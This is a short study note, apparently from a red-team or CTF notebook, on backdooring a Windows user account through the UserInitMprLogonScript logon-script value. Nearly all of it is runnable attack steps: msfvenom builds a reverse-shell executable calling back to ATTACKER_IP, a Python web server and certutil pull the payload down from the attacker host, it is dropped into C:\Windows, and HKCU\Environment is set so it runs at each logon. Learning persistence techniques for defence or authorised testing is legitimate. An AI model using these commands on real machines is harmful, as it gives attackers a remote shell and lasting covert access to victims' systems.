#### Logon Scripts via `UserInitMprLogonScript`
One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. This is user-specific persistence method, this works by ***assigning a logon script to a user*** that will run when logging into the machine.

#### Create a Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

#### Transfer the Shell 
```bash
python3 -m http.server
```

```cmd
certutil -urlcache -split -f http://<attacker_ip>:8000/revshell.exe
move revshell.exe C:\Windows
```

#### Create an Environment Variable for a User
1. Go to: `HKCU\Environment` in registry. 
2. Use the `UserInitMprLogonScript` entry to point to our payload.
![[Logon script.png]]

**This registry key has no equivalent in HKLM, making your backdoor apply to the current user only.**

**Sign out of your current session and log in again.**